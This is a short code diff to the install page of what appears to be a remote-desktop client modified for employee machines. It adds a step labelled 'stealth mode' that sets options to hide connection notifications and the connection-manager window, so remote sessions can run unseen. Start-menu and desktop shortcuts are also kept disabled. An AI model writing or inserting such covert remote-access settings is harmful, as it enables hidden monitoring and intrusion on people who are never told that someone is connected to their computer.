@@ -286,13 +286,17 @@ class _InstallPageBodyState extends State<_InstallPageBody>
     // Step 4: Save Employee ID to config
     await bind.mainSetOption(key: "employee_id", value: employeeId);
 
+    // Step 5: Enable stealth mode (hide connection notifications)
+    await bind.mainSetOption(key: "approve-mode", value: "password");
+    await bind.mainSetOption(key: "allow-hide-cm", value: "Y");
+
     String args = '';
     // Always false/disabled as per request
     // if (startmenu.value) args += ' startmenu';
     // if (desktopicon.value) args += ' desktopicon';
     // if (printer.value) args += ' printer';
     
-    // Step 5: Install
+    // Step 6: Install
     bind.installInstallMe(options: args, path: controller.text);
   }
 
